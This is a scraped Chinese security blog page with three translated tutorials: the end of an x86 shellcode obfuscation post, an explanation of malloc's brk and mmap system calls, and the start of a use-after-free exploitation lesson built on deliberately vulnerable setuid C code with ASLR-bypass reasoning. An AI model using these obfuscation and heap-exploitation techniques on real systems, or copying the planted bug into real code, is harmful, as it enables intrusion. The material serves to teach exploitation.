5    0000000c: ba44332211                       MOV EDX, 0x11223344  
6    00000011: e2f9                             LOOP 0xc 
</code></pre><p>输出：</p>
<pre><code>0    00000000: fc                               CLD  
1    00000001: b1a2                             MOV CL, 0xa2  
2    00000003: 82c1c4                           ADD CL, 0xc4  
3    00000006: 82e961                           SUB CL, 0x61  
4    00000009: 80fc02                           CMP AH, 0x2  
5    0000000c: 7518                             JNZ 0x26  
6    0000000e: 66b80596                         MOV AX, 0x9605  
7    00000012: 6681c0ce9a                       ADD AX, 0x9ace  
8    00000017: 6681c0a039                       ADD AX, 0x39a0  
9    0000001c: 6681f04371                       XOR AX, 0x7143  
10   00000021: 6681c0886d                       ADD AX, 0x6d88  
11   00000026: ba44351577                       MOV EDX, 0x77153544  
12   0000002b: 81f2fbd13236                     XOR EDX, 0x3632d1fb  
13   00000031: 81f299f2d3ed                     XOR EDX, 0xedd3f299  
14   00000037: 81c22c9ffb09                     ADD EDX, 0x9fb9f2c  
15   0000003d: 81eae2468266                     SUB EDX, 0x668246e2  
16   00000043: 81f2345d4f41                     XOR EDX, 0x414f5d34  
17   00000049: 49                               DEC ECX  
18   0000004a: 75da                             JNZ 0x26
</code></pre><p>源代码在[GitHub][<a href="https://github.com/kgretzky/python-x86-obfuscator]上都可以找到。" target="_blank" rel="external">https://github.com/kgretzky/python-x86-obfuscator]上都可以找到。</a><br><strong>下载DOWNLODAD</strong><br>[Source code][<a href="https://github.com/kgretzky/python-x86-obfuscator" target="_blank" rel="external">https://github.com/kgretzky/python-x86-obfuscator</a>]</p>
<p><strong>未完待续…</strong><br>这个博客系列的第一部分就结束了。接下来的部分会涵盖其他指令的混淆问题。</p>
<p>敬请期待！</p>
<p>你可以在[Twitter][<a href="https://twitter.com/mrgretzky]和[Google+][https://plus.google.com/u/0/101650735283323618463/]上关注我。" target="_blank" rel="external">https://twitter.com/mrgretzky]和[Google+][https://plus.google.com/u/0/101650735283323618463/]上关注我。</a></p>
<p>如果你有什么问题或建议，期待你在评论区评论。</p>
<p><strong>第二部分</strong>已发布！</p>
<p>[X86 Shellcode 混淆 - 第二部分][<a href="http://www.csyssec.org/20170223/obfuscation1/" target="_blank" rel="external">http://www.csyssec.org/20170223/obfuscation1/</a>]</p>
<p><strong>完</strong></p>
<hr>
<p>来源： <a href="https://breakdev.org/" target="_blank" rel="external">https://breakdev.org/</a><br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170223/obfuscation1/" target="_blank" rel="external">X86 shellcode代码混淆</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/漏洞利用/">漏洞利用</a>

      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Shellcode/">Shellcode</a></li></ul>

      
    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-mallocsystemcall"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/20170105/mallocsystemcall/">Malloc使用的系统调用</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	Posted on <a href="/20170105/mallocsystemcall/" class="article-date">
	  <time datetime="2017-01-05T03:07:05.000Z" itemprop="datePublished">一月 5, 2017</time>
	</a>

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>译者：资深工程师@Barret</p>
<hr>
<p><strong>CSysSec注</strong>： 本系列文章译自安全自由工作者<a href="https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/" target="_blank" rel="external">Sploitfun</a>的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，本系列所有文章涉及的源码可以在<a href="https://github.com/sploitfun/lsploits" target="_blank" rel="external">这里</a>找到。CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170105/mallocsystemcall" target="_blank" rel="external">Linux(X86)漏洞利用系列-Malloc使用的系统调用</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
<hr>
<blockquote>
<ul>
<li>0X01 brk</li>
<li>0X02 mmap</li>
</ul>
</blockquote>
<p>学到这里，你应该已经知道malloc是使用系统调用从操作系统获取内存，正如下图所示，malloc是使用<a href="http://man7.org/linux/man-pages/man2/sbrk.2.html" target="_blank" rel="external">brk</a>或者<a href="http://man7.org/linux/man-pages/man2/mmap.2.html" target="_blank" rel="external">mmap</a>系统调用来获得内存分配的。</p>
<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/mallocsystemcall1.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/mallocsystemcall1.png" width="450"></a><br>    <figcaption></figcaption><br></figure>

<h3 id="0X01-brk"><a href="#0X01-brk" class="headerlink" title="0X01 brk"></a>0X01 brk</h3><p><a href="http://lxr.free-electrons.com/source/mm/mmap.c?v=3.8#L252" target="_blank" rel="external">brk</a>通过增加程序中断位置(<a href="http://lxr.free-electrons.com/source/include/linux/mm_types.h?v=3.8#L365" target="_blank" rel="external">brk</a>)从内核中获取内存（初始化非0）。一开始堆段的起始(<a href="http://lxr.free-electrons.com/source/include/linux/mm_types.h?v=3.8#L365" target="_blank" rel="external">start_brk</a>)和结束(<a href="http://lxr.free-electrons.com/source/include/linux/mm_types.h?v=3.8#L365" target="_blank" rel="external">brk</a>)都指向同一位置。</p>
<blockquote>
<ul>
<li>当<a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" target="_blank" rel="external">ASLR</a>关闭时，start_brk和brk将指向数据段(<a href="http://lxr.free-electrons.com/source/include/linux/mm_types.h?v=3.8#L364" target="_blank" rel="external">end_data</a>)的末尾</li>
<li>当ASLR打开时，start_brk和brk指向的位置即为数据段(end_data)的末尾地址加上随机brk偏移地址所指向的位置</li>
</ul>
</blockquote>
<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/mallocsystemcall2.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/mallocsystemcall2.png" width="450"></a><br>    <figcaption></figcaption><br></figure>

<p>由上图可知，start_brk即为堆段的初始位置，brk（程序中断）即为堆段的末尾位置<br><em><u>Example:</u></em></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"> <span class="comment">/* sbrk and brk example */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">        <span class="keyword">void</span> *curr_brk, *tmp_brk = <span class="literal">NULL</span>;</div><div class="line"></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Welcome to sbrk example:%d\n"</span>, getpid());</div><div class="line"></div><div class="line">        <span class="comment">/* sbrk(0) gives current program break location */</span></div><div class="line">        tmp_brk = curr_brk = sbrk(<span class="number">0</span>);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Program Break Location1:%p\n"</span>, curr_brk);</div><div class="line">        getchar();</div><div class="line"></div><div class="line">        <span class="comment">/* brk(addr) increments/decrements program break location */</span></div><div class="line">        brk(curr_brk+<span class="number">4096</span>);</div><div class="line"></div><div class="line">        curr_brk = sbrk(<span class="number">0</span>);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Program break Location2:%p\n"</span>, curr_brk);</div><div class="line">        getchar();</div><div class="line"></div><div class="line">        brk(tmp_brk);</div><div class="line"></div><div class="line">        curr_brk = sbrk(<span class="number">0</span>);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Program Break Location3:%p\n"</span>, curr_brk);</div><div class="line">        getchar();</div><div class="line"></div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><em><u>输出分析:</u></em><br>在增加程序中断之前：在下面的输出中我们可以看到这没有堆段，因此</p>
<blockquote>
<ul>
<li>start_brk=brk=end_data=0x804b000</li>
</ul>
</blockquote>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ ./sbrk </div><div class="line">Welcome to sbrk example:<span class="number">6141</span></div><div class="line">Program Break Location1:<span class="number">0x804b000</span></div><div class="line">...</div><div class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/<span class="number">6141</span>/maps</div><div class="line">...</div><div class="line"><span class="number">0804</span>a000<span class="number">-0804</span>b000 rw-p <span class="number">00001000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539624</span>     /home/sploitfun/ptmalloc.ppt/syscalls/sbrk</div><div class="line">b7e21000-b7e22000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> </div><div class="line">...</div><div class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$</div></pre></td></tr></table></figure>
<p><em>增加了程序中断位置之后：</em>在下面的输出中我们可以看到这有堆段了，因此：</p>
<blockquote>
<ul>
<li>start_brk=end_data=0x804b000</li>
<li>brk=0x804c000</li>
</ul>
</blockquote>
<p>在这<br>0804b000-0804c000是这个堆段的虚拟地址范围<br>rw-p是权限（读，写，不可执行，私有）<br>00000000代表文件偏移量——由于它不是从其它文件映射而来，所以就为0<br>00:00是主要/次要设备编号——由于它不是从其它文件映射而来，所以这里为0<br>0代表Inode编号——由于它不是从其它文件映射而来，所以这里为0<br>[heap]堆段</p>
<h3 id="0X02-mmap"><a href="#0X02-mmap" class="headerlink" title="0X02 mmap"></a>0X02 mmap</h3><p> malloc使用<a href="http://lxr.free-electrons.com/source/mm/mmap.c?v=3.8#L1285" target="_blank" rel="external">mmap</a>创建私有匿名映射段。私有匿名映射的主要目的是分配新的内存（零填充），并且这个新的内存将被调用进程独占使用。<br><em><u>Example:</u></em></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"> <span class="comment">/* Private anonymous mapping example using mmap syscall */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="keyword">static</span> <span class="keyword">inline</span> <span class="title">errExit</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></div><div class="line">&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%s failed. Exiting the process\n"</span>, msg);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">        <span class="keyword">int</span> ret = <span class="number">-1</span>;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Welcome to private anonymous mapping example::PID:%d\n"</span>, getpid());</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Before mmap\n"</span>);</div><div class="line">        getchar();</div><div class="line">        <span class="keyword">char</span>* addr = <span class="literal">NULL</span>;</div><div class="line">        addr = mmap(<span class="literal">NULL</span>, (<span class="keyword">size_t</span>)<span class="number">132</span>*<span class="number">1024</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</div><div class="line">        <span class="keyword">if</span> (addr == MAP_FAILED)</div><div class="line">                errExit(<span class="string">"mmap"</span>);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"After mmap\n"</span>);</div><div class="line">        getchar();</div><div class="line"></div><div class="line">        <span class="comment">/* Unmap mapped region. */</span></div><div class="line">        ret = munmap(addr, (<span class="keyword">size_t</span>)<span class="number">132</span>*<span class="number">1024</span>);</div><div class="line">        <span class="keyword">if</span>(ret == <span class="number">-1</span>)</div><div class="line">                errExit(<span class="string">"munmap"</span>);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"After munmap\n"</span>);</div><div class="line">        getchar();</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><em><u>输出分析：</u></em><br><em><u>mmap之前：</u></em>在下面的输出中，我们只能看到属于共享库libc.so和ld-linux.so的内存映射段</p>
<pre><code>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps
08048000-08049000 r-xp 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap
08049000-0804a000 r--p 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap
0804a000-0804b000 rw-p 00001000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap
b7e21000-b7e22000 rw-p 00000000 00:00 0 
...
sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$
</code></pre><p><em><u>mmap之后：</u></em>在下面的输出中，我们可以观察到我们的内存映射段（b7e00000 - b7e21000，大小为132KB）与已有的内存映射段（b7e21000 - b7e22000）结合了</p>
<p>在这里<br>b7e00000-b7e22000是这个堆段的虚拟地址范围<br>rw-p代表权限（读，写，不可执行，私有）<br>00000000代表文件偏移量——由于它不是从其它文件映射而来，所以就为0<br>00:00是主要/次要设备编号——由于它不是从其它文件映射而来，所以这里为0<br>0代表Inode编号——由于它不是从其它文件映射而来，所以这里为0</p>
<p><em><u>munmap之后：</u></em>在下面的输出中，我们可以看到我们的内存映射段是未映射的，即它的相应的内存被释放到操作系统。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/<span class="number">6067</span>/maps</div><div class="line"><span class="number">08048000</span><span class="number">-08049000</span> r-xp <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539691</span>     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</div><div class="line"><span class="number">08049000</span><span class="number">-0804</span>a000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539691</span>     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</div><div class="line"><span class="number">0804</span>a000<span class="number">-0804</span>b000 rw-p <span class="number">00001000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539691</span>     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</div><div class="line">b7e21000-b7e22000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> </div><div class="line">...</div><div class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$</div></pre></td></tr></table></figure>
<p><em><u>注意：</u></em>在我们的示例程序执行过程中ASLR是被关闭的。</p>
<p><em><u>参考文献：</u></em><br>1.<a href="http://duartes.org/gustavo/blog/post/anatomy-of-a-program-in-memory/" target="_blank" rel="external">Anatomy of program in memory</a></p>
<hr>
<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170105/mallocsystemcall" target="_blank" rel="external">Linux(X86)漏洞利用系列-Malloc使用的系统调用</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/系统内核/">系统内核</a>

      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kernel/">Kernel</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Memory/">Memory</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li></ul>

      
    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-useafterfree"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/20170104/useafterfree/">Use-after-free</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	Posted on <a href="/20170104/useafterfree/" class="article-date">
	  <time datetime="2017-01-04T15:36:12.000Z" itemprop="datePublished">一月 4, 2017</time>
	</a>

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>作者: <a href="http://www.csyssec.org/about" target="_blank" rel="external">CSysSec出品</a></p>
<hr>
<p><strong>CSysSec注</strong>： 本系列文章译自安全自由工作者<a href="https://sploitfun.wordpress.com/about-2/" target="_blank" rel="external">Sploitfun</a>的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，本系列所有文章涉及的源码可以在<a href="https://github.com/sploitfun/lsploits" target="_blank" rel="external">这里</a>找到。CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/useafterfree" target="_blank" rel="external">Linux(X86)漏洞利用系列-Use-after-free)</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
<hr>
<blockquote>
<ul>
<li>0X01 什么是use-after-free</li>
<li>0X02 什么是信息泄露,攻击者如何利用</li>
</ul>
</blockquote>
<p><u>阅读基础</u>:<br>    <a href="http://www.csyssec.org/20161231/stackoffbyone/" target="_blank" rel="external">栈内off-by-one漏洞利用</a><br>    <a href="http://www.csyssec.org/20170104/glibcmalloc/" target="_blank" rel="external">深入理解glibc malloc</a><br><u>VM Setup</u>: Fedora 20(x86)</p>
<h3 id="0X01-什么是use-after-free"><a href="#0X01-什么是use-after-free" class="headerlink" title="0X01 什么是use-after-free"></a>0X01 什么是use-after-free</h3><p>当一个堆内存指针已经被释放，继续使用这个指针时，就称为use-after-free bug。这种bug能导致任意代码执行。</p>
<p><u>漏洞代码</u>:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFSIZE1 1020</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFSIZE2 ((BUFSIZE1/2) - 4)</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</div><div class="line"></div><div class="line"> <span class="keyword">char</span>* name = <span class="built_in">malloc</span>(<span class="number">12</span>); <span class="comment">/* [1] */</span></div><div class="line"> <span class="keyword">char</span>* details = <span class="built_in">malloc</span>(<span class="number">12</span>); <span class="comment">/* [2] */</span></div><div class="line"> <span class="built_in">strncpy</span>(name, argv[<span class="number">1</span>], <span class="number">12</span><span class="number">-1</span>); <span class="comment">/* [3] */</span></div><div class="line"> <span class="built_in">free</span>(details); <span class="comment">/* [4] */</span></div><div class="line"> <span class="built_in">free</span>(name);  <span class="comment">/* [5] */</span></div><div class="line"> <span class="built_in">printf</span>(<span class="string">"Welcome %s\n"</span>,name); <span class="comment">/* [6] */</span></div><div class="line"> fflush(<span class="built_in">stdout</span>);</div><div class="line"></div><div class="line"> <span class="keyword">char</span>* tmp = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(<span class="number">12</span>); <span class="comment">/* [7] */</span></div><div class="line"> <span class="keyword">char</span>* p1 = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(BUFSIZE1); <span class="comment">/* [8] */</span></div><div class="line"> <span class="keyword">char</span>* p2 = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(BUFSIZE1); <span class="comment">/* [9] */</span></div><div class="line"> <span class="built_in">free</span>(p2); <span class="comment">/* [10] */</span></div><div class="line"> <span class="keyword">char</span>* p2_1 = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(BUFSIZE2); <span class="comment">/* [11] */</span></div><div class="line"> <span class="keyword">char</span>* p2_2 = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(BUFSIZE2); <span class="comment">/* [12] */</span></div><div class="line"></div><div class="line"> <span class="built_in">printf</span>(<span class="string">"Enter your region\n"</span>);</div><div class="line"> fflush(<span class="built_in">stdout</span>);</div><div class="line"> read(<span class="number">0</span>,p2,BUFSIZE1<span class="number">-1</span>); <span class="comment">/* [13] */</span></div><div class="line"> <span class="built_in">printf</span>(<span class="string">"Region:%s\n"</span>,p2); </div><div class="line"> <span class="built_in">free</span>(p1); <span class="comment">/* [14] */</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><u>编译命令</u>:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#echo 2 &gt; /proc/sys/kernel/randomize_va_space</span></div><div class="line">$gcc -o vuln vuln.c</div><div class="line">$sudo chown root vuln</div><div class="line">$sudo chgrp root vuln</div><div class="line">$sudo chmod +s vuln</div></pre></td></tr></table></figure>
<p><u>注意</u>: 不像<a href="http://www.csyssec.org/20170104/heap-offbyone/" target="_blank" rel="external">前文</a>，这里打开了ASLR. 现在让我们开始利用UaF bug吧，由于已经打开了ASLR，我们用信息泄露和暴力破解技术来绕过它。</p>
<p>上述漏洞代码含有两个UaF bug，分别在第[6]和[13]行。它们相对应的堆内存分别在第[5]和第[10]行被释放，但它们的指针在释放后仍然再次被使用 （第[6]和[13]行)！！ 第[6]行的UaF导致信息泄露，而第[13]行的UaF导致任意代码执行。</p>
<h3 id="0X02-什么是信息泄露？攻击者如何利用？"><a href="#0X02-什么是信息泄露？攻击者如何利用？" class="headerlink" title="0X02 什么是信息泄露？攻击者如何利用？"></a>0X02 什么是信息泄露？攻击者如何利用？</h3><p>在漏洞代码中(第[6]行)，信息是通过堆地址被泄露的。泄露的堆地址可以帮助攻击者很容易的算出已经被随机化的堆基地址，从而击败ASLR!</p>
<p>为了理解堆地址是如何被泄露的，我们先来理解一下漏洞代码的上半部分。</p>
<ul>
<li>第[1]行分配了16字节的堆内存给’name’</li>
<li>第[2]行分配了16字节的堆内存给’details’</li>
<li>第[3]行将程序的argv[1]参数拷贝到’name’堆内存区域</li>
<li>第[4]和[5]行回收’name’和’details’堆内存给glibc malloc。</li>
<li>第[6]行的printf 在’name’指针被释放后继续使用，导致泄露堆地址。</li>
</ul>
<p>从<a href="http://www.csyssec.org/20170104/glibcmalloc/" target="_blank" rel="external">前文</a>我们知道，对应于’name’和’details’指针的chunk属于fast chunk。当这些fast chun被释放时，会被存储在fast bins的<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3887" target="_blank" rel="external">0索引处</a>(index zero)。我们也知道每个fast bin含有空闲chunks的单链表。因此在我们的例子中，fast bin的 0索引中的单链表形式如下所示：</p>
<pre><code>main_arena.fastbinsY[0] ---&gt; &apos;name_chunk_address&apos; ---&gt; &apos;details_chunk_address&apos; ---&gt; NULL
</code></pre><p>由于这种单链表形式，’name’的前四个字节含有’details_chunk’的地址。因此，当’name’被输出时，‘details_chunk’的地址先被输出。从堆栈布局，我们知道’details_chunk’ 位于堆基地址的偏移0x10处。因此，从获取被泄露的地址中减去0x10，就可以得到堆的基地址了。</p>
<pre><code>如何做到任意代码执行
</code></pre><p>现在已经获取随机化的堆基地址，理解漏洞代码的下半部分，让我们来看看是怎么做到任意代码执行的。</p>
<ul>
<li>第[7]行分配了16字节的堆内存给’tmp’</li>
<li>第[8]行分配了1024字节的堆内存给’p1’</li>
<li>第[9]行分配了1024字节的堆内存给’p2’</li>
<li>第[10]行回收了’p2’的1024字节堆内存给glibc malloc</li>
<li>第[11]行分配了512字节的堆内存给’p2_1’</li>
<li>第[12]行分配了512字节的堆内存给’p2_2’</li>
<li>第[13]行的read在’p2’被释放后继续使用它</li>
<li>第[14]行回收了’p1’的1024字节堆内存给glibc malloc，当程序退出时，导致任意代码执行。</li>
</ul>
<p>通过阅读<a href="http://www.csyssec.org/20170104/glibcmalloc/" target="_blank" rel="external">前文</a>，我们知道当’p2’被回收给glibc maloc时候，会被<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L4017" target="_blank" rel="external">合并</a>到top chunk。 之后，当为’p2_1’请求内存时，会从top chunk中<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3755" target="_blank" rel="external">分配</a>- ‘p2’和’p2_1’含有相同的堆地址。当为’p2_2’请求内存时，会从top chunk中- ‘p2\2’距’p2’有512字节。当’p2’指针释放后被使用(第[13]行)，攻击者控制的数据(最多1019字节)被拷贝到’pc_1’中，而’p2_1’只有512字节，剩下的被攻击者控制的字节会覆盖下一个chunk’p2_2’，这样一来就允许攻击者覆盖下一个chunk的头部size域!!!</p>
<p><u>堆布局</u>：</p>
<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/useafterfree.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/useafterfree.png" width="450"></a><br>    <figcaption></figcaption><br></figure>


